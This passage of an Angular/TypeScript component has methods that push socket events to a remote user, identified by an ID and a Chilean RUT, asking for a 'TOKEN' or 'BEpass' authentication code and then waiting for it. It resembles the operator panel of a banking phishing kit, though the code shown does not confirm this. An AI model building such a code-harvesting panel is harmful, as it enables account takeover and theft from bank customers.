      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
    return true;
  }
  // #endregion

  // #region TOKEN EVENT
  cerrarRequestToken() {
    this.tokenModal = false;
  }

  requestToken(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string,
    isOnline: boolean
  ) {
    if (!isOnline) {
      this.userOnline = false;
      this.showSendEvent = true;
      return false;
    }
    this.userOnline = true;

    this.eventType = action.toUpperCase();
    if (!this.tokenModal) {
      this.transferData = { action, data, indice, reciveId, userRut };
      this.tokenModal = true;
      return false;
    }
    return true;
  }

  requestTokenExe() {
    this.tokenModal = false;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = `SOLICITO ${this.eventType}`;
    const aditionals = {
      log: kbLog,
    };

    this.socketSrv.showOpt({
      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
    return true;
  }
  // #endregion

  // #region TOKEN EVENT
  cerrarRequestBEpass() {
    this.bepassModal = false;
  }

  requestBEpass(
    action: string,
    data: any,
    indice: number,
    reciveId: string,
    userRut: string,
    isOnline: boolean
  ) {
    if (!isOnline) {
      this.userOnline = false;
      this.showSendEvent = true;
      return false;
    }
    this.userOnline = true;

    this.eventType = action.toUpperCase();
    if (!this.bepassModal) {
      this.transferData = { action, data, indice, reciveId, userRut };
      this.bepassModal = true;
      return false;
    }
    return true;
  }

  requestBEpassExe() {
    this.bepassModal = false;
    let id = 'numero' + this.transferData.indice;
    let loadId = 'loading' + this.transferData.indice;

    const d = new Date();
    let fecha = `${d.getDate()}-${d.getMonth()}-${d.getFullYear()}`;
    let kbLog = `SOLICITO ${this.eventType}`;
    const aditionals = {
      log: kbLog,
    };

    this.socketSrv.showOpt({
      userId: this.transferData.reciveId,
      event: this.transferData.action,
      rut: this.transferData.userRut,
      aditionals,
    });

    setTimeout(() => {
      this.currentWaiting =
        'ESPERANDO ' + this.transferData.action.toUpperCase();
    }, 1000);
  }
  // #endregion

  kbExpande(indice: number) {
    // if(this.notExpande){
    //   this.notExpande = false;
    //   return false;
    // }

    let id = 'panel' + indice;
    let idChild = 'panelc' + indice;
    let main: any = document.getElementById(id);
    main.classList.toggle('actives');
    let state = document.getElementById(idChild)?.style.display;

    if (state === 'none') {
      const apply = document.getElementById(idChild) as HTMLInputElement;
      apply.style.display = 'block';
      // console.log("id: "+id+" display block");
    } else {
      const apply = document.getElementById(idChild) as HTMLInputElement;
      apply.style.display = 'none';
      // console.log("id: "+id+" display none");
    }

    return true;
  }

  justNumerKeyPress(event: KeyboardEvent) {
    const tecla = document.all ? event.keyCode : event.which;
    if (tecla === 8) {
      return true;
    }
    const patron = /[0-9]/;
    const teclaFinal = String.fromCharCode(tecla);
    return patron.test(teclaFinal);
  }

  clickOutside(event: any): void {
    if (!this.showAlert) {
      if (this.audioRef.nativeElement.loop === true) {
        this.audioRef.nativeElement.loop = false;
      }
    }
  }
}
